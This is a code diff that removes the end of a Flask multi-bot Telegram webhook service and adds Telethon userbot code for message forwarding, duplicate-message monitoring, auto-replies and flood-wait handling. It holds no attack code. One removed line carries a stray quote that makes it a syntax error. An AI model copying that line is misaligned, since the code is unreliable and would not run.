-                            username_display = at_username(first_username) if first_username else "no username"
-                            added_wat = utc_to_wat_ts(first_added_at)
-                            
-                            tasks, total_tasks, total_pages = get_user_tasks_preview(bot_id, first_user_id, hours, 0)
-                            
-                            if not tasks:
-                                body = f"👤 User: {first_user_id} ({username_display})\nAdded: {added_wat}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n📋 No tasks found in the last {hours} hours."
-                            else:
-                                lines = []
-                                for task in tasks:
-                                    lines.append(f"🕒 {task['created_at']}\n📝 Preview: {task['preview']}\n📊 Progress: {task['sent_count']}/{task['total_words']} words")
-                                
-                                body = f"👤 User: {first_user_id} ({username_display})\nAdded: {added_wat}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n📋 Tasks (last {hours}h, page 1/{total_pages}):\n\n" + "\n\n".join(lines)
-                            
-                            keyboard = []
-                            
-                            task_nav = []
-                            if total_pages > 1:
-                                task_nav.append({"text": "Next Page ➡️", "callback_data": f"owner_checkallpreview_{first_user_id}_1_{hours}"})
-                            if task_nav:
-                                keyboard.append(task_nav)
-                            
-                            user_nav = []
-                            user_nav.append({"text": f"User 1/{len(all_users)}", "callback_data": "owner_checkallpreview_noop"})
-                            
-                            if len(all_users) > 1:
-                                next_user_id = all_users[1][0]
-                                user_nav.append({"text": "Next User ➡️", "callback_data": f"owner_checkallpreview_{next_user_id}_0_{hours}"})
-                            
-                            if user_nav:
-                                keyboard.append(user_nav)
-                            
-                            keyboard.append([{"text": "🔙 Back to Menu", "callback_data": "owner_backtomenu"}])
-                            
-                            clear_owner_state(bot_id, uid)
-                            send_message(bot_id, uid, body, {"inline_keyboard": keyboard})
-                            return jsonify({"ok": True}")
-            
-            # Handle commands
-            if text.startswith("/"):
-                parts = text.split(None, 1)
-                cmd = parts[0].split("@")[0].lower()
-                args = parts[1] if len(parts) > 1 else ""
-                
-                # Clear any existing owner state when new command comes
-                clear_owner_state(bot_id, uid)
-                
-                if cmd == "/ownersets":
-                    if uid not in config["owner_ids"]:
-                        send_message(bot_id, uid, f"🚫 Owner only. {config['owner_tag']} notified.")
-                        notify_owners(bot_id, f"🚨 Unallowed /ownersets attempt by {at_username(username) if username else uid} (ID: {uid}).")
-                        return jsonify({"ok": True})
-                    send_ownersets_menu(bot_id, uid)
-                    return jsonify({"ok": True})
-                else:
-                    return handle_command(bot_id, uid, username, cmd, args)
-            else:
-                # Handle regular text input
-                return handle_user_text(bot_id, uid, username, text)
-    except Exception:
-        logger.exception("webhook handling error for %s", bot_id)
-    
-    return jsonify({"ok": True})
-
-# ===================== FLASK ROUTES =====================
-
-@app.route("/", methods=["GET"])
-def root():
-    return "Multi-Bot WordSplitter running.", 200
-
-# Separate health endpoints for each bot
-@app.route("/health/a", methods=["GET", "HEAD"])
-def health_a():
-    try:
-        # Test database connection
-        test_result = execute_query("bot_a", "SELECT 1", fetch_one=True)
-        db_ok = test_result is not None
-    except Exception:
-        db_ok = False
-    
-    return jsonify({
-        "ok": True, 
-        "bot": "A", 
-        "ts": now_ts(),
-        "db_connected": db_ok,
-        "workers": len(BOT_STATES["bot_a"]["user_workers"])
-    }), 200
-
-@app.route("/health/b", methods=["GET", "HEAD"])
-def health_b():
-    try:
-        test_result = execute_query("bot_b", "SELECT 1", fetch_one=True)
-        db_ok = test_result is not None
-    except Exception:
-        db_ok = False
-    
-    return jsonify({
-        "ok": True, 
-        "bot": "B", 
-        "ts": now_ts(),
-        "db_connected": db_ok,
-        "workers": len(BOT_STATES["bot_b"]["user_workers"])
-    }), 200
-
-@app.route("/health/c", methods=["GET", "HEAD"])
-def health_c():
-    try:
-        test_result = execute_query("bot_c", "SELECT 1", fetch_one=True)
-        db_ok = test_result is not None
-    except Exception:
-        db_ok = False
-    
-    return jsonify({
-        "ok": True, 
-        "bot": "C", 
-        "ts": now_ts(),
-        "db_connected": db_ok,
-        "workers": len(BOT_STATES["bot_c"]["user_workers"])
-    }), 200
-
-# Separate webhook endpoints for each bot
-@app.route("/webhook/a", methods=["POST"])
-def webhook_a():
-    return handle_webhook("bot_a")
-
-@app.route("/webhook/b", methods=["POST"])
-def webhook_b():
-    return handle_webhook("bot_b")
-
-@app.route("/webhook/c", methods=["POST"])
-def webhook_c():
-    return handle_webhook("bot_c")
-
-# ===================== WEBHOOK SETUP =====================
-
-def set_webhook(bot_id: str):
-    config = BOTS_CONFIG[bot_id]
-    if not config["telegram_api"] or not config["webhook_url"]:
-        logger.info("Webhook not configured for %s", bot_id)
+    if not await check_authorization(update, context):
         return
+
+    if await check_phone_number_required(user_id):
+        message = update.message if update.message else update.callback_query.message
+        await ask_for_phone_number(user_id, message.chat.id, context)
+        return
+
+    message = update.message if update.message else update.callback_query.message
+
+    user = await db_call(db.get_user, user_id)
+    if not user or not user["is_logged_in"]:
+        await message.reply_text(
+            "❌ **You're not connected!**\n\nUse /login to connect your account.", parse_mode="Markdown"
+        )
+        return
+
+    logout_states[user_id] = {"phone": user["phone"]}
+
+    await message.reply_text(
+        f"⚠️ **Confirm Logout**\n\n📱 **Enter your phone number to confirm disconnection:**\n\nYour connected phone: `{user['phone']}`\n\nType your phone number exactly to confirm logout.",
+        parse_mode="Markdown",
+    )
+
+async def handle_logout_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
+    user_id = update.effective_user.id
+
+    if user_id not in logout_states:
+        return False
+
+    text = update.message.text.strip()
+    stored_phone = logout_states[user_id]["phone"]
+
+    if text != stored_phone:
+        await update.message.reply_text(
+            f"❌ **Phone number doesn't match!**\n\nExpected: `{stored_phone}`\nYou entered: `{text}`",
+            parse_mode="Markdown",
+        )
+        return True
+
+    if user_id in user_clients:
+        client = user_clients[user_id]
+        try:
+            # Remove forwarding handler
+            if user_id in forward_handler_registered:
+                handler = forward_handler_registered.get(user_id)
+                if handler:
+                    try:
+                        client.remove_event_handler(handler)
+                    except Exception:
+                        pass
+                forward_handler_registered.pop(user_id, None)
+            
+            # Remove monitoring handlers
+            if user_id in monitor_handler_registered:
+                for handler in monitor_handler_registered[user_id]:
+                    try:
+                        client.remove_event_handler(handler)
+                    except Exception:
+                        pass
+                monitor_handler_registered.pop(user_id, None)
+
+            await client.disconnect()
+        except Exception:
+            pass
+        finally:
+            user_clients.pop(user_id, None)
+
     try:
-        webhook_url = config["webhook_url"]
-        if not webhook_url.endswith(f"/webhook/{bot_id.split('_')[-1].lower()}"):
-            webhook_url = f"{webhook_url.rstrip('/')}/webhook/{bot_id.split('_')[-1].lower()}"
-        
-        get_session(bot_id).post(f"{config['telegram_api']}/setWebhook", 
-                                json={"url": webhook_url}, 
-                                timeout=SHARED_SETTINGS["requests_timeout"])
-        logger.info("Webhook set for %s to %s", bot_id, webhook_url)
+        await db_call(db.save_user, user_id, None, None, None, False)
     except Exception:
-        logger.exception("set_webhook failed for %s", bot_id)
-
-# ===================== MAIN =====================
-
-def main():
-    # Set webhooks for all bots
-    for bot_id in BOTS_CONFIG:
-        set_webhook(bot_id)
+        pass
     
-    port = int(os.environ.get("PORT", "8080"))
-    app.run(host="0.0.0.0", port=port)
+    phone_verification_states.pop(user_id, None)
+    forwarding_tasks_cache.pop(user_id, None)
+    monitoring_tasks_cache.pop(user_id, None)
+    target_entity_cache.pop(user_id, None)
+    chat_entity_cache.pop(user_id, None)
+    user_send_semaphores.pop(user_id, None)
+    user_rate_limiters.pop(user_id, None)
+    logout_states.pop(user_id, None)
+    reply_states.pop(user_id, None)
+    auto_reply_states.pop(user_id, None)
+
+    await update.message.reply_text(
+        "👋 **Account disconnected successfully!**\n\n✅ All your forwarding and monitoring tasks have been stopped.\n🔄 Use /login to connect again.",
+        parse_mode="Markdown",
+    )
+    return True
+
+# ============================
+# CHAT ID UTILITIES
+# ============================
+async def getallid_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+
+    if not await check_authorization(update, context):
+        return
+
+    if await check_phone_number_required(user_id):
+        await ask_for_phone_number(user_id, update.message.chat.id, context)
+        return
+
+    user = await db_call(db.get_user, user_id)
+    if not user or not user["is_logged_in"]:
+        await update.message.reply_text("❌ **You need to connect your account first!**\n\nUse /login to connect.", parse_mode="Markdown")
+        return
+
+    await update.message.reply_text("🔄 **Fetching your chats...**")
+
+    await show_chat_categories(user_id, update.message.chat.id, None, context)
+
+async def show_chat_categories(user_id: int, chat_id: int, message_id: int, context: ContextTypes.DEFAULT_TYPE):
+    if user_id not in user_clients:
+        return
+
+    message_text = """🗂️ **Chat ID Categories**
+
+📋 Choose which type of chat IDs you want to see:
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🤖 **Bots** - Bot accounts
+📢 **Channels** - Broadcast channels
+👥 **Groups** - Group chats
+👤 **Private** - Private conversations
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+💡 Select a category below:"""
+
+    keyboard = [
+        [InlineKeyboardButton("🤖 Bots", callback_data="chatids_bots_0"), InlineKeyboardButton("📢 Channels", callback_data="chatids_channels_0")],
+        [InlineKeyboardButton("👥 Groups", callback_data="chatids_groups_0"), InlineKeyboardButton("👤 Private", callback_data="chatids_private_0")],
+    ]
+
+    if message_id:
+        await context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=message_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
+    else:
+        await context.bot.send_message(chat_id=chat_id, text=message_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
+
+async def show_categorized_chats(user_id: int, chat_id: int, message_id: int, category: str, page: int, context: ContextTypes.DEFAULT_TYPE):
+    from telethon.tl.types import User, Channel, Chat
+
+    if user_id not in user_clients:
+        return
+
+    client = user_clients[user_id]
+
+    categorized_dialogs = []
+    async for dialog in client.iter_dialogs():
+        entity = dialog.entity
+
+        if category == "bots":
+            if isinstance(entity, User) and entity.bot:
+                categorized_dialogs.append(dialog)
+        elif category == "channels":
+            if isinstance(entity, Channel) and getattr(entity, "broadcast", False):
+                categorized_dialogs.append(dialog)
+        elif category == "groups":
+            if isinstance(entity, (Channel, Chat)) and not (isinstance(entity, Channel) and getattr(entity, "broadcast", False)):
+                categorized_dialogs.append(dialog)
+        elif category == "private":
+            if isinstance(entity, User) and not entity.bot:
+                categorized_dialogs.append(dialog)
+
+    PAGE_SIZE = 10
+    total_pages = max(1, (len(categorized_dialogs) + PAGE_SIZE - 1) // PAGE_SIZE)
+    start = page * PAGE_SIZE
+    end = start + PAGE_SIZE
+    page_dialogs = categorized_dialogs[start:end]
+
+    category_emoji = {"bots": "🤖", "channels": "📢", "groups": "👥", "private": "👤"}
+    category_name = {"bots": "Bots", "channels": "Channels", "groups": "Groups", "private": "Private Chats"}
+
+    emoji = category_emoji.get(category, "💬")
+    name = category_name.get(category, "Chats")
+
+    if not categorized_dialogs:
+        chat_list = f"{emoji} **{name}**\n\n📭 **No {name.lower()} found!**\n\nTry another category."
+    else:
+        chat_list = f"{emoji} **{name}** (Page {page + 1}/{total_pages})\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+
+        for i, dialog in enumerate(page_dialogs, start + 1):
+            chat_name = dialog.name[:30] if dialog.name else "Unknown"
+            chat_list += f"{i}. **{chat_name}**\n   🆔 `{dialog.id}`\n\n"
+
+        chat_list += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        chat_list += f"📊 Total: {len(categorized_dialogs)} {name.lower()}\n"
+        chat_list += "💡 Tap to copy the ID!"
+
+    keyboard = []
+
+    nav_row = []
+    if page > 0:
+        nav_row.append(InlineKeyboardButton("⬅️ Previous", callback_data=f"chatids_{category}_{page - 1}"))
+    if page < total_pages - 1:
+        nav_row.append(InlineKeyboardButton("Next ➡️", callback_data=f"chatids_{category}_{page + 1}"))
+
+    if nav_row:
+        keyboard.append(nav_row)
+
+    keyboard.append([InlineKeyboardButton("🔙 Back to Categories", callback_data="chatids_back")])
+
+    await context.bot.edit_message_text(chat_list, chat_id=chat_id, message_id=message_id, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
+
+# ============================
+# FORWARDING SYSTEM
+# ============================
+def ensure_forward_handler_registered_for_user(user_id: int, client: TelegramClient):
+    if forward_handler_registered.get(user_id):
+        return
+
+    async def _forward_message_handler(event):
+        try:
+            await optimized_gc()
+            
+            is_edit = isinstance(event, events.MessageEdited)
+            message = getattr(event, "message", None)
+            if not message:
+                return
+                
+            message_text = getattr(event, "raw_text", None) or getattr(message, "message", None)
+            if not message_text:
+                return
+
+            chat_id = getattr(event, "chat_id", None) or getattr(message, "chat_id", None)
+            if chat_id is None:
+                return
+
+            user_tasks = forwarding_tasks_cache.get(user_id)
+            if not user_tasks:
+                return
+
+            message_outgoing = getattr(message, "out", False)
+            
+            for task in user_tasks:
+                if not task.get("filters", {}).get("control", True):
+                    continue
+                    
+                if message_outgoing and not task.get("filters", {}).get("outgoing", True):
+                    continue
+                    
+                if chat_id in task.get("source_ids", []):
+                    forward_tag = task.get("filters", {}).get("forward_tag", False)
+                    filtered_messages = apply_filters(message_text, task.get("filters", {}))
+                    
+                    for filtered_msg in filtered_messages:
+                        for target_id in task.get("target_ids", []):
+                            try:
+                                if send_queue is None:
+                                    continue
+                                    
+                                await send_queue.put((user_id, target_id, filtered_msg, task.get("filters", {}), forward_tag, chat_id if forward_tag else None, message.id if forward_tag else None))
+                            except asyncio.QueueFull:
+                                logger.warning("Send queue full")
+        except Exception:
+            logger.exception("Error in forward message handler")
+
+    try:
+        client.add_event_handler(_forward_message_handler, events.NewMessage())
+        client.add_event_handler(_forward_message_handler, events.MessageEdited())
+        forward_handler_registered[user_id] = _forward_message_handler
+    except Exception:
+        logger.exception("Failed to add forward event handler")
+
+async def resolve_target_entity_once(user_id: int, client: TelegramClient, target_id: int):
+    ent = _get_cached_target(user_id, target_id)
+    if ent:
+        return ent
+
+    try:
+        entity = await client.get_input_entity(int(target_id))
+        _set_cached_target(user_id, target_id, entity)
+        return entity
+    except Exception:
+        return None
+
+async def resolve_targets_for_user(user_id: int, target_ids: List[int]):
+    client = user_clients.get(user_id)
+    if not client:
+        return
+    for tid in target_ids:
+        for attempt in range(3):
+            ent = await resolve_target_entity_once(user_id, client, tid)
+            if ent:
+                break
+            await asyncio.sleep(TARGET_RESOLVE_RETRY_SECONDS)
+
+# ============================
+# MONITORING SYSTEM
+# ============================
+async def update_monitoring_for_user(user_id: int):
+    if user_id not in user_clients:
+        return
+    
+    client = user_clients[user_id]
+    
+    # Clear existing handlers
+    if user_id in monitor_handler_registered:
+        for handler in monitor_handler_registered[user_id]:
+            try:
+                client.remove_event_handler(handler)
+            except Exception:
+                pass
+        monitor_handler_registered[user_id] = []
+    
+    # Get monitored chat IDs
+    monitored_chat_ids = set()
+    user_tasks = monitoring_tasks_cache.get(user_id, [])
+    for task in user_tasks:
+        monitored_chat_ids.update(task.get("chat_ids", []))
+    
+    if not monitored_chat_ids:
+        logger.info(f"No monitored chats for user {user_id}")
+        return
+    
+    # Register handlers for each chat
+    for chat_id in monitored_chat_ids:
+        await register_monitor_handler_for_chat(user_id, chat_id, client)
+    
+    logger.info(f"Updated monitoring for user {user_id}: {len(monitored_chat_ids)} chat(s)")
+
+async def register_monitor_handler_for_chat(user_id: int, chat_id: int, client: TelegramClient):
+    
+    async def _monitor_chat_handler(event):
+        try:
+            await optimized_gc()
+            
+            message = event.message
+            if not message:
+                return
+            
+            if hasattr(message, 'reactions') and message.reactions:
+                return
+            
+            message_text = event.raw_text or message.message
+            if not message_text:
+                return
+            
+            sender_id = message.sender_id
+            message_id = message.id
+            message_outgoing = getattr(message, "out", False)
+            
+            logger.debug(f"Processing monitored chat {chat_id} for user {user_id}")
+            
+            user_tasks_local = monitoring_tasks_cache.get(user_id, [])
+            for task in user_tasks_local:
+                if chat_id not in task.get("chat_ids", []):
+                    continue
+                
+                settings = task.get("settings", {})
+                task_label = task.get("label", "Unknown")
+                
+                if message_outgoing and not settings.get("outgoing_message_monitoring", True):
+                    continue
+                
+                if settings.get("check_duplicate_and_notify", True):
+                    message_hash = create_message_hash(message_text, sender_id)
+                    
+                    if is_duplicate_message(user_id, chat_id, message_hash):
+                        logger.info(f"DUPLICATE DETECTED: User {user_id}, Task {task_label}, Chat {chat_id}")
+                        
+                        # Auto reply if enabled
+                        if settings.get("auto_reply_system", False) and settings.get("auto_reply_message"):
+                            auto_reply_message = settings.get("auto_reply_message", "")
+                            try:
+                                chat_entity = await client.get_input_entity(chat_id)
+                                await client.send_message(chat_entity, auto_reply_message, reply_to=message_id)
+                                logger.info(f"Auto reply sent for duplicate in chat {chat_id}")
+                            except Exception as e:
+                                logger.exception(f"Error sending auto reply: {e}")
+                        
+                        # Manual reply notification
+                        if settings.get("manual_reply_system", True):
+                            try:
+                                if notification_queue:
+                                    await notification_queue.put((user_id, task, chat_id, message_id, message_text, message_hash))
+                                else:
+                                    logger.error("Notification queue not initialized!")
+                            except asyncio.QueueFull:
+                                logger.warning("Notification queue full, dropping duplicate alert for user=%s", user_id)
+                            except Exception as e:
+                                logger.exception(f"Error queuing notification: {e}")
+                        continue
+                    
+                    store_message_hash(user_id, chat_id, message_hash, message_text)
+        
+        except Exception as e:
+            logger.exception(f"Error in monitor message handler for user {user_id}, chat {chat_id}: {e}")
+    
+    try:
+        client.add_event_handler(_monitor_chat_handler, events.NewMessage(chats=chat_id))
+        client.add_event_handler(_monitor_chat_handler, events.MessageEdited(chats=chat_id))
+        
+        monitor_handler_registered.setdefault(user_id, []).append(_monitor_chat_handler)
+        logger.info(f"Registered monitor handler for user {user_id}, chat {chat_id}")
+    except Exception as e:
+        logger.exception(f"Failed to register monitor handler for user {user_id}, chat {chat_id}: {e}")
+
+# ============================
+# NOTIFICATION HANDLING
+# ============================
+async def handle_notification_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    text = (update.message.text or "").strip()
+    
+    if not update.message.reply_to_message:
+        return
+    
+    replied_message_id = update.message.reply_to_message.message_id
+    
+    if replied_message_id not in notification_messages:
+        return
+    
+    notification_data = notification_messages[replied_message_id]
+    
+    if notification_data["user_id"] != user_id:
+        return
+    
+    task_label = notification_data["task_label"]
+    chat_id = notification_data["chat_id"]
+    original_message_id = notification_data["original_message_id"]
+    message_preview = notification_data.get("message_preview", "Unknown message")
+    
+    user_tasks = monitoring_tasks_cache.get(user_id, [])
+    task = next((t for t in user_tasks if t["label"] == task_label), None)
+    
+    if not task:
+        await update.message.reply_text("❌ Task not found!")
+        return
+    
+    if user_id not in user_clients:
+        await update.message.reply_text("❌ You need to be logged in to send replies!")
+        return
+    
+    client = user_clients[user_id]
+    
+    try:
+        chat_entity = await client.get_input_entity(chat_id)
+        await client.send_message(chat_entity, text, reply_to=original_message_id)
+        
+        escaped_text = escape_markdown(text, version=2)
+        escaped_preview = escape_markdown(message_preview, version=2)
+        
+        await update.message.reply_text(
+            f"✅ **Reply sent successfully!**\n\n"
+            f"📝 **Your reply:** {escaped_text}\n"
+            f"🔗 **Replying to:** `{escaped_preview}`\n\n"
+            "The duplicate sender has been notified with your reply.",
+            parse_mode="Markdown"
+        )
+        
+        logger.info(f"User {user_id} sent manual reply to duplicate in chat {chat_id}")
+        notification_messages.pop(replied_message_id, None)
+    
+    except Exception as e:
+        logger.exception(f"Error sending manual reply for user {user_id}: {e}")
+        await update.message.reply_text(
+            f"❌ **Failed to send reply:** {str(e)}\n\n"
+            "Please try again or check your connection.",
+            parse_mode="Markdown"
+        )
+
+async def handle_reply_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.callback_query.answer("Reply action not implemented yet")
+
+# ============================
+# FLOOD WAIT NOTIFICATIONS
+# ============================
+async def notify_user_flood_wait(user_id: int, wait_seconds: int):
+    """Notify user about flood wait start (only once)"""
+    try:
+        from telegram import Bot
+        bot = Bot(token=BOT_TOKEN)
+        
+        wait_minutes = wait_seconds // 60
+        if wait_seconds % 60 > 0:
+            wait_minutes += 1  # Round up
+        
+        resume_time_utc1 = format_time_from_timestamp(time.time() + wait_seconds)
+        
+        message = f"""⏰ **Flood Wait Alert**
+
+Your account is temporarily limited by Telegram.
+
+📋 **Details:**
+• Wait time: {wait_minutes} minutes
+• Resumes at: {resume_time_utc1}
+
+⚠️ **Please note:**
+• This is a Telegram restriction, not the bot
+• Bot will automatically resume when the wait ends
+• No action is needed on your part
+
+🔄 **Status:** ⏳ Waiting for Telegram to lift restriction..."""
+        
+        await bot.send_message(user_id, message, parse_mode="Markdown")
+        
+    except Exception:
+        pass  # Silently fail if we can't notify user
+
+async def notify_user_flood_wait_ended(user_id: int):
+    """Notify user that flood wait has ended"""
+    try:
+        from telegram import Bot
+        bot = Bot(token=BOT_TOKEN)
+        
+        current_time_utc1 = format_time_utc1_am_pm()
+        
+        message = f"""✅ **Flood Wait Ended**
+
+Your account restriction has been lifted!
+
+📋 **Status:**
+• Time: {current_time_utc1}
+• Forwarding has resumed automatically
+• All queued messages are being sent
+• You can now send messages normally
+
+🔄 **Status:** ✅ Active and forwarding..."""
+        
+        await bot.send_message(user_id, message, parse_mode="Markdown")
+        
+    except Exception:
+        pass
+
+# ============================
+# WORKER SYSTEMS
+# ============================
+async def send_worker_loop(worker_id: int):
+    logger.info(f"Send worker {worker_id} started")
+    global send_queue
+    if send_queue is None:
+        return
+    
+    # Track performance
+    processed_count = 0
+    last_log_time = time.time()
+    
+    while True:
+        try:
+            # Use get_nowait to avoid blocking if queue is empty
+            try:
+                job = send_queue.get_nowait()
+            except asyncio.QueueEmpty:
+                await asyncio.sleep(0.01)
+                continue
+                
+            # Process job immediately
+            user_id, target_id, message_text, task_filters, forward_tag, source_chat_id, message_id = job
+            
+            # Check flood wait
+            in_flood_wait, wait_left, should_notify_end = flood_wait_manager.is_in_flood_wait(user_id)
+            
+            # Send end notification if flood wait just ended
+            if should_notify_end:
+                asyncio.create_task(notify_user_flood_wait_ended(user_id))
+            
+            if in_flood_wait:
+                # Requeue the job for later
+                try:
+                    send_queue.put_nowait(job)
+                except asyncio.QueueFull:
+                    logger.warning(f"Queue full while requeueing flood wait message")
+                finally:
+                    send_queue.task_done()
+                
+                # Sleep a bit before checking next job
+                await asyncio.sleep(min(wait_left, 1.0))
+                continue
+            
+            client = user_clients.get(user_id)
+            if not client:
+                send_queue.task_done()
+                continue
+            
+            # Check rate limiter
+            await _consume_token(user_id, 1.0)
+            
+            try:
+                entity = _get_cached_target(user_id, target_id)
+                if not entity:
+                    entity = await resolve_target_entity_once(user_id, client, target_id)
+                
+                if not entity:
+                    send_queue.task_done()
+                    continue
+                
+                try:
+                    if forward_tag and source_chat_id and message_id:
+                        try:
+                            source_entity = await client.get_input_entity(int(source_chat_id))
+                            await client.forward_messages(entity, message_id, source_entity)
+                        except Exception:
+                            await client.send_message(entity, message_text)
+                    else:
+                        await client.send_message(entity, message_text)
+                        
+                    # Clear any flood wait on success
+                    flood_wait_manager.clear_flood_wait(user_id)
+                    
+                except FloodWaitError as fwe:
+                    wait = int(getattr(fwe, "seconds", 10))
+                    logger.warning(f"Worker {worker_id}: Flood wait {wait}s for user {user_id}")
+                    
+                    # Set flood wait and check if we should notify
+                    should_notify_start, wait_time = flood_wait_manager.set_flood_wait(user_id, wait)
+                    
+                    # Requeue the job
+                    try:
+                        send_queue.put_nowait(job)
+                    except asyncio.QueueFull:
+                        logger.warning(f"Queue full while requeueing flood wait")
+                    
+                    # Notify user if it's the first major flood wait
+                    if should_notify_start and wait_time > 60:
+                        asyncio.create_task(notify_user_flood_wait(user_id, wait_time))
+                        
+                except Exception as e:
+                    logger.debug(f"Send failed: {e}")
+                    
+            except Exception as e:
+                logger.debug(f"Entity resolution failed: {e}")
+            
+            finally:
+                send_queue.task_done()
+                processed_count += 1
+                
+                # Log performance
+                current_time = time.time()
+                if current_time - last_log_time > 30:
+                    qsize = send_queue.qsize() if send_queue else 0
+                    logger.info(f"Worker {worker_id}: Processed {processed_count}, Queue: {qsize}")
+                    processed_count = 0
+                    last_log_time = current_time
+                    
+        except asyncio.CancelledError:
+            break
+        except Exception:
+            await asyncio.sleep(0.01)
+
+async def notification_worker(worker_id: int):
+    logger.info(f"Notification worker {worker_id} started")
+    
+    if notification_queue is None:
+        logger.error("notification_worker started before queue initialized")
+        return
+    
+    bot_instance = None
+    
+    while True:
+        try:
+            user_id, task, chat_id, message_id, message_text, message_hash = await notification_queue.get()
+            logger.info(f"Processing notification for user {user_id}, chat {chat_id}")
+        except asyncio.CancelledError:
+            break
+        except Exception as e:
+            logger.exception(f"Error getting item from notification_queue in worker {worker_id}: {e}")
+            break
+        
+        try:
+            settings = task.get("settings", {})
+            if not settings.get("manual_reply_system", True):
+                logger.debug(f"Manual reply system disabled for user {user_id}")
+                continue
+            
+            task_label = task.get("label", "Unknown")
+            preview_text = message_text[:100] + "..." if len(message_text) > 100 else message_text
+            
+            # Get bot instance if not available
+            if bot_instance is None:
+                from telegram import Bot
+                bot_instance = Bot(token=BOT_TOKEN)
+            
+            # Use UTC+1 time with AM/PM format
+            current_time_utc1 = format_time_utc1_am_pm()
+            
+            notification_msg = (
+                f"🚨 **DUPLICATE MESSAGE DETECTED!**\n\n"
+                f"**Task:** {task_label}\n"
+                f"**Time:** {current_time_utc1}\n\n"
+                f"📝 **Message Preview:**\n`{preview_text}`\n\n"
+                f"💬 **Reply to this message to respond to the duplicate!**\n"
+                f"(Swipe left on this message and type your reply)"
+            )
+            
+            try:
+                sent_message = await bot_instance.send_message(
+                    chat_id=user_id,
+                    text=notification_msg,
+                    parse_mode="Markdown"
+                )
+                
+                notification_messages[sent_message.message_id] = {
+                    "user_id": user_id,
+                    "task_label": task_label,
+                    "chat_id": chat_id,
+                    "original_message_id": message_id,
+                    "duplicate_hash": message_hash,
+                    "message_preview": preview_text
+                }
+                
+                logger.info(f"✅ Sent duplicate notification to user {user_id} for chat {chat_id}")
+            
+            except Exception as e:
+                logger.error(f"Failed to send notification to user {user_id}: {e}")
+        
+        except Exception as e:
+            logger.exception(f"Unexpected error in notification worker {worker_id}: {e}")
+        finally:
+            try:
+                notification_queue.task_done()
+            except Exception:
+                pass
+
+async def start_send_workers():
+    global _send_workers_started, send_queue, send_worker_tasks
+    if _send_workers_started:
+        return
+
+    if send_queue is None:
+        send_queue = asyncio.Queue(maxsize=SEND_QUEUE_MAXSIZE)
+
+    for i in range(SEND_WORKER_COUNT):
+        t = asyncio.create_task(send_worker_loop(i + 1))
+        send_worker_tasks.append(t)
+
+    _send_workers_started = True
+    logger.info(f"Spawned {SEND_WORKER_COUNT} send workers")
+
+async def start_monitor_workers():
+    global _monitor_workers_started, notification_queue, monitor_worker_tasks
+    if _monitor_workers_started:
+        return
+
+    if notification_queue is None:
+        notification_queue = asyncio.Queue(maxsize=SEND_QUEUE_MAXSIZE)
+
+    for i in range(MONITOR_WORKER_COUNT):
+        t = asyncio.create_task(notification_worker(i + 1))
+        monitor_worker_tasks.append(t)
+
+    _monitor_workers_started = True
+    logger.info(f"Spawned {MONITOR_WORKER_COUNT} monitor workers")
+
+async def monitor_queue_health():
+    """Monitor queue health and adjust processing"""
+    global send_queue, notification_queue
+    
+    while True:
+        try:
+            # Check send queue
+            if send_queue:
+                qsize = send_queue.qsize()
+                maxsize = send_queue.maxsize if hasattr(send_queue, 'maxsize') else SEND_QUEUE_MAXSIZE
+                
+                # Log queue status
+                if qsize > maxsize * 0.8:
+                    logger.warning(f"Send queue nearly full: {qsize}/{maxsize}")
+                
+                # If queue is too full, skip some messages to avoid memory issues
+                if qsize > maxsize * 0.9:
+                    try:
+                        for _ in range(min(10, qsize // 10)):
+                            send_queue.get_nowait()
+                            send_queue.task_done()
+                    except asyncio.QueueEmpty:
+                        pass
+            
+            # Check notification queue
+            if notification_queue:
+                nqsize = notification_queue.qsize()
+                nmaxsize = notification_queue.maxsize if hasattr(notification_queue, 'maxsize') else SEND_QUEUE_MAXSIZE
+                
+                if nqsize > nmaxsize * 0.8:
+                    logger.warning(f"Notification queue nearly full: {nqsize}/{nmaxsize}")
+                
+                if nqsize > nmaxsize * 0.9:
+                    try:
+                        for _ in range(min(10, nqsize // 10)):
+                            notification_queue.get_nowait()
+                            notification_queue.task_done()
+                    except asyncio.QueueEmpty:
+                        pass
+                    
+            await asyncio.sleep(5)  # Check every 5 seconds
+            
+        except asyncio.CancelledError:
+            break
+        except Exception:
+            await asyncio.sleep(5)
+
+async def performance_logger():
+    """Log performance metrics periodically"""
+    while True:
+        try:
+            send_qsize = send_queue.qsize() if send_queue else 0
+            notify_qsize = notification_queue.qsize() if notification_queue else 0
+            active_users = len(user_clients)
+            forward_tasks = sum(len(tasks) for tasks in forwarding_tasks_cache.values())
+            monitor_tasks = sum(len(tasks) for tasks in monitoring_tasks_cache.values())
+            
+            logger.info(f"📊 Performance: SendQ={send_qsize}, NotifyQ={notify_qsize}, Users={active_users}, ForwardTasks={forward_tasks}, MonitorTasks={monitor_tasks}")
+            
+            await asyncio.sleep(60)  # Log every minute
+            
+        except asyncio.CancelledError:
+            break
+        except Exception:
+            await asyncio.sleep(60)
+
+# ============================
+# USER SYSTEM INITIALIZATION
+# ============================
+async def start_forwarding_for_user(user_id: int):
+    if user_id not in user_clients:
+        return
+
+    client = user_clients[user_id]
+    forwarding_tasks_cache.setdefault(user_id, [])
+    _ensure_user_target_cache(user_id)
+    _ensure_user_send_semaphore(user_id)
+    _ensure_user_rate_limiter(user_id)
+
+    ensure_forward_handler_registered_for_user(user_id, client)
+    
+    user_tasks = forwarding_tasks_cache.get(user_id, [])
+    if user_tasks:
+        all_targets = []
+        for task in user_tasks:
+            all_targets.extend(task.get("target_ids", []))
+        
+        if all_targets:
+            unique_targets = list(set(all_targets))
